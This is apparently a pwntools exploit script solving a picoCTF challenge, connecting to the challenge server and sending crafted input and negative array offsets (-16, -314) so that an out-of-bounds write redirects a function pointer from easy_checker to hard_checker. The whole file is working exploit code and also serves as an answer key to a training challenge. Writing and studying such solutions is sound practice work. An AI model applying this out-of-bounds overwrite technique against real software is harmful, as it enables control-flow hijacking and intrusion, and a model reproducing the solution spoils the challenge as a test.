from pwn import*

p = remote("saturn.picoctf.net", 60448)
#p = process("./vuln")
#gdb.attach(p,api=True)

p.sendline(b"A"*19 + b"/" + b"7")

p.sendline(b"-16")
p.sendline(b"-314")
p.interactive()
#fun -0x40 fun[-16]
#0x080492fc  easy_checker
#0x08049436  hard_checker  -314
